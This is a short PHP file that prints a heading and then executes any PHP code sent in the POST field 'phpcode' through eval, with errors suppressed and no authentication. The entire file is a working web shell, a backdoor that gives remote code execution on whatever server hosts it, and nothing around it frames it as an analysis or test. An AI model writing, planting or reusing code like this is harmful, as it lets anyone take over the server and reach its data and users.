<?php
echo "<center><div id=logostrip>Results of PHP execution<br><br>";
@eval(stripslashes($_POST['phpcode']));
?>